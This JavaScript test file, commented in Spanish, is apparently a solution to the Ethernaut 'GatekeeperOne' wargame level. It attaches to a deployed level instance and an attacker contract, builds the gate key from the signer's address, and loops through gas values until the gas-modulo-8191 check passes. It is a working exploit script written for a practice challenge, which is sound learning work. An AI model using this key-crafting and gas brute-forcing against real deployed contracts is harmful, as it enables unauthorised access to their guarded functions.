const { expect } = require("chai");

describe("Gatekeeper", function() {
  let gate,contratoAtacante,atacante;
  beforeEach(async()=>{
    [atacante]=await ethers.getSigners();
    const Contrato = await ethers.getContractFactory("GatekeeperOne");
    const toa='0xc5E6956324cf9d381A01415c1972DCB000bb6076' //direccion contrato ethernaut gate instanciado
    gate = await Contrato.attach(toa);

    const contratoAttacker = await ethers.getContractFactory("GatekeeperAttacker");
    //const toa2='0x9F932ba97225EF4528DC8f7a81627Ef7f2B6F72B' //direccion contrato atacante deployado
    const toa2='0xC8215f1aBAc76eCAae52ff24f59B4A1211F3d12B' //direccion contrato atacante deployado
    contratoAtacante = await contratoAttacker.attach(toa2);
  }); // end describe

  it("Fuerza bruta hasta 8191",async function(){
    const gas=80000;
    let i=0;
    const txOrigen=ethers.utils.hexZeroPad(atacante.address,32);
    const parte3=ethers.utils.hexDataSlice(txOrigen,30); //ultimos 8 del numero de cuenta
    const parte1="0x00000001"; //primeros 8 diferente de cero
    const parte2="0x0000"; //debe comenzar con ceros en segunda parte
    const key=ethers.utils.hexConcat([parte1,parte2,parte3]);
    console.log(`Key:${key}`)
    //await contratoAtacante.checkGate3(key);
    for(i=0;i<8191;i++){ //enviar gas hasta que el gas restante sea multiplo de 8191
      console.log(`Probando: ${i}`)
      try{
        await contratoAtacante.enter(gate.address,key,gas+i,{gasLimit:120000,});
        break;
      } catch(error){}
    }
    console.log(`${i} sucess`);
  });//end it

});